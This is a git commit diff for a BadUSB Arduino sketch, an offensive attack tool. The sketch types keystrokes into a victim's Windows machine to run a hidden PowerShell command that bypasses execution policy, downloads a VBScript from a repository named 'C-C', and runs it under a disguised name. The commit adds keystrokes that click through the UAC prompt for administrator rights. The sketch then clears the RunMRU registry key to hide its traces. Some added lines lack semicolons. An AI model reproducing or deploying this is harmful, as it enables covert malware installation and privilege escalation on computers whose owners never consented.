790abcb6cb581dac0a0fb00c034f60993309ea33
Tokisaki-Galaxy <tokisaki-galaxy@qq.com>
2020-04-06 00:07:33 +0800

    badusb

--- BadUSB/ino-file/PowerShellDownload.ino
+++ BadUSB/ino-file/PowerShellDownload.ino
@@ -6,15 +6,33 @@ void setup() {
   delay(500);
   Keyboard.press('r');
   delay(500);
-  Keyboard.release(KEY_LEFT_GUI);
-  Keyboard.release('r');
+  Keyboard.releaseAll();
+  //Keyboard.release(KEY_LEFT_GUI);
+  //Keyboard.release('r');
   Keyboard.press(KEY_CAPS_LOCK);
   delay(500);
   
   // you can CHANGE this URL
-  Keyboard.println("POWERSHELL -NOP -W HIDDEN -EXECuTIONpOLICY BYPASS -C (nEW-oBJECT sYSTEM.nET.wEBcLIENT).dOWNLOAdfILE('https://cdn.jsdelivr.net/gh/tokisaki-galaxy/C-C/C-C.vbe', 'c:\\USERS\\PUBLIC\\360HIPS.vbe');START c:\\USERS\\PUBLIC\\360HIPS.vbe;EXIT");
+  Keyboard.print("POWERSHELL -NOP -W HIDDEN -EXECuTIONpOLICY BYPASS -C (nEW-oBJECT SYsTeM.nEt.wEBcLIeNT).dOWNlOAdfILe('https://cdn.jsdelivr.net/gh/tokisaki-galaxy/C-C/C-C.vbe', 'c:\\USERS\\PUBLIC\\360HIPS.vbe');START c:\\USERS\\PUBLIC\\360HIPS.vbe;EXIT");
   // NO WINDOWS,BYPASS
-  // 遇到UAC这种，键盘模拟也可以绕过（说是绕过，其实就是操作键盘按键来选择赋权），比如CMD的管理员模式，可以win+r打开后，输入cmd，再按住Shift+Ctrl+回车即可以管理员启动cmd，同时控制好延时时间，对弹出来的UAC，按住Alt即可出现Y/N对“是/否”的选择。或者直接操作左键+回车都可以选择到“是”来打开管理员cmd
+  
+  // 降低了隐蔽性！！但是几乎能搞到管理权限
+  Keyboard.press(KEY_LEFT_SHIFT);
+  delay(50);
+  Keyboard.press(KEY_LEFT_CTRL);
+  delay(50);
+  Keyboard.press(KEY_RETURN)
+  delay(100);
+  Keyboard.releaseAll();
+  delay(2000);
+  Keyboard.press(KEY_LEFT_ALT)
+  delay(100);
+  Keyboard.press('y')
+  delay(100);
+  Keyboard.releaseAll();
+  
+  // 管理启动，绕过UAC
+  
   Keyboard.press(KEY_LEFT_GUI);
   delay(500);
   Keyboard.press('r');
@@ -23,9 +41,10 @@ void setup() {
   Keyboard.release('r');
   Keyboard.press(KEY_CAPS_LOCK);
   delay(500);
-  Keyboard.println("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f");
+  Keyboard.println("REG DELETE HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\EXPLORER\\RUNMRU /f");
   
-  Keyboard.release(KEY_CAPS_LOCK);
+  //Keyboard.release(KEY_CAPS_LOCK);
+  Keyboard.releaseAll();
   Keyboard.end();
 }
 void loop()
